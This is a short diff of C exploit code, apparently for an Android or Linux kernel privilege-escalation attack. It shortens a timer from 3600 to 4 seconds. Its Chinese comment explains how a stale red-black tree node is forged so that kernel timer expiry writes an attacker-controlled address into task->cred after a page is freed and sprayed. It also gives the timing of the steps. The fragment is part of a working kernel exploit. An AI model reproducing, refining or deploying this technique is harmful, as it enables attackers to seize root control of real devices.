@@ -851,7 +851,15 @@ static void *exec_fn(void *arg)
 	armed_event.sigev_notify = SIGEV_SIGNAL;
 	armed_event.sigev_signo = SIGRTMIN;
 	memset(&spec, 0, sizeof(spec));
-	spec.it_value.tv_sec = 3600;
+	/*
+	 * 2.0.32：armed 定时器 3600s → 4s。重定向机制 = 内核软中断到期处理对
+	 * stale 节点执行 rb_erase：节点 rb_right=NULL/cred[1]=0、rb_left=&cred 槽/
+	 * cred[2]、parent=node_kva/cred[0]，erase 的 __rb_change_child 会把
+	 * node_kva 写进 task->cred。erase 必须发生在页释放+喷洒之后——3600s
+	 * 永远等不到；4s 时序 = 子死(0.2s)→喷洒(~1.5s)→到期(~4s)。若内核在
+	 * 退出时已正常摘除节点（无 CVE 残链），此改动无害（维持 uid=2000）。
+	 */
+	spec.it_value.tv_sec = 4;
 	if (pin_cpu(0))
 		_exit(116);
 	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
